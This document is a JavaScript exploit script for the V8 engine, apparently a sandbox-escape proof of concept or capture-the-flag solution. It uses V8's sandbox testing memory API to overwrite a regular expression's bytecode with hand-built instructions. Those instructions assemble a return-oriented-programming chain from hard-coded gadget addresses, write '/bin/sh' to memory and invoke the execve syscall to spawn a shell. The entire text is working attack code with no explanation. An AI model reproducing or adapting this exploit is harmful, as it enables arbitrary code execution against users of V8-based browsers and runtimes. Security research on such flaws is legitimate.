// Flags:  --sandbox-fuzzing
let s = "aaaaa";

var sbxMemView = new Sandbox.MemoryView(0, 0xfffffff8);
var addrOf = (o) => Sandbox.getAddressOf(o);

var dv = new DataView(sbxMemView);

var readHeap4 = (offset) => dv.getUint32(offset, true);
var readHeap8 = (offset) => dv.getBigUint64(offset, true);

var writeHeap1 = (offset, value) => dv.setUint8(offset, value, true);
var writeHeap4 = (offset, value) => dv.setUint32(offset, value, true);
var writeHeap8 = (offset, value) => dv.setBigUint64(offset, value, true);
var regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;
let addr_regex = addrOf(regex);
let data_addr = readHeap4(addr_regex + 0xc);

regex.exec(s);
let bytecode = readHeap4(data_addr + 0x1b);
writeHeap4(data_addr + 0x2f, 2);

let arr = [];
function push_reg(idx) {
    arr.push((idx << 8) & 0xffffff00 | 0x03);
}

function pop_reg(idx) {
    arr.push((idx << 8) & 0xffffff00 | 0x0c);
}

function mov_reg1_to_reg2(idx1, idx2) {
    push_reg(idx1);
    pop_reg(idx2);
}

function advance_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x09);
    arr.push(value);
}

function set_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x08);
    arr.push(value);
}

function success() {
    arr.push(0x0000000e);
}

let idx = 0x52;
function add_gadget(addr) {
    mov_reg1_to_reg2(3, 5);
    advance_reg(5, addr);
    mov_reg1_to_reg2(5, idx++);
    mov_reg1_to_reg2(4, idx++);
}

// ROP Here
// ret addr starts at idx 0x52
mov_reg1_to_reg2(0x53, 4);
mov_reg1_to_reg2(0x52, 3);
advance_reg(3, 0xfdc59272);
add_gadget(0x018b074f) // pop r14; ret;
set_reg(idx++, 0x6e69622f);
set_reg(idx++, 0x0068732f);
add_gadget(0x00d8e669); // pop rax; ret; 
add_gadget(0x03ddd000);
add_gadget(0x031972b1); // mov qword ptr [rax], r14; pop rbx; pop r14; pop rbp; ret; 
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
add_gadget(0x018b074f); // pop r14; ret; 
set_reg(idx++, 0);
set_reg(idx++, 0);
add_gadget(0x00d8e669); // pop rax; ret; 
add_gadget(0x03ddd008);
add_gadget(0x031972b1); // mov qword ptr [rax], r14; pop rbx; pop r14; pop rbp; ret; 
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
set_reg(idx++, 0xdeadbeef);
add_gadget(0x00efb921); // pop rdi; ret; 
add_gadget(0x03ddd000);
add_gadget(0x00b5559e); // pop rsi; ret; 
add_gadget(0x03ddd008);
add_gadget(0x00efbe3f); // pop rdx; ret; 
add_gadget(0x03ddd008);
add_gadget(0x00d8e669); // pop rax; ret; 
set_reg(idx++, 0x0000003b);
set_reg(idx++, 0);
add_gadget(0x01cfd7f8); // syscall; 
success();

for (var i = 0; i < arr.length; i++) {
    writeHeap4(bytecode + 0x7 + 4 * i, arr[i]);
}

regex.exec(s);
